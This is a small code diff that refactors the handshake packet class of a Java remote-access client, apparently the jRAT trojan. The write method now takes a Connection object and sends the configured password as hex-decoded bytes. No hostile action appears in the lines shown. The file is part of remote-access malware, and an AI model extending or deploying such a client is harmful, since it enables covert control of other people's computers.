@@ -1,14 +1,13 @@
 package jrat.client.packets.outgoing;
 
-import jrat.common.codec.Hex;
-import jrat.common.io.StringWriter;
 import jrat.client.Configuration;
-import java.io.DataOutputStream;
+import jrat.client.Connection;
+import jrat.common.codec.Hex;
 
 public class Packet1InitHandshake extends AbstractOutgoingPacket {
 
 	@Override
-	public void write(DataOutputStream dos, StringWriter sw) throws Exception {		
+	public void write(Connection dos) throws Exception {
 		String data = Configuration.getPass();
 
 		dos.write(Hex.decodeToBytes(data));
